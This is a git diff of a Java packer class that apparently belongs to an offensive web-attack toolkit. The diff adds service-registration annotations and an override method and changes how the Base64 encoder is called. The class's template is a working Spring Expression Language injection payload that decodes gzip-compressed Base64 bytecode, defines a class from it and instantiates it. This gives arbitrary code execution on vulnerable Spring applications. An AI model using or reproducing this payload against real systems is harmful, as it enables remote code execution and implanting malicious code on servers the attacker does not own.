@@ -2,7 +2,10 @@ package com.reajason.javaweb.packer.spel;
 
 import com.reajason.javaweb.packer.ClassPackerConfig;
 import com.reajason.javaweb.packer.Packer;
+import com.reajason.javaweb.packer.PackerMeta;
 import com.reajason.javaweb.packer.Packers;
+import com.reajason.javaweb.packer.base64.GzipBase64Packer;
+import org.kohsuke.MetaInfServices;
 
 
 /**
@@ -13,12 +16,19 @@ import com.reajason.javaweb.packer.Packers;
  * @author ReaJason
  * @since 2024/12/13
  */
+@MetaInfServices(Packer.class)
+@PackerMeta(name = Packers.SpELSpringGzip, parent = Packers.SpEL, order = 1520)
 public class SpELSpringGzipPacker implements Packer {
+
+    @Override
+    public boolean transportedAsSpelExpression() {
+        return true;
+    }
     String template = "T(org.springframework.cglib.core.ReflectUtils).defineClass('{{className}}',T(org.springframework.util.StreamUtils).copyToByteArray(new java.util.zip.GZIPInputStream(new java.io.ByteArrayInputStream(T(org.springframework.util.Base64Utils).decodeFromString('{{base64Str}}')))),new java.net.URLClassLoader(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).newInstance()";
 
     @Override
     public String pack(ClassPackerConfig config) {
         return template.replace("{{className}}", config.getClassName())
-                .replace("{{base64Str}}", Packers.GzipBase64.getInstance().pack(config));
+                .replace("{{base64Str}}", new GzipBase64Packer().pack(config));
     }
 }
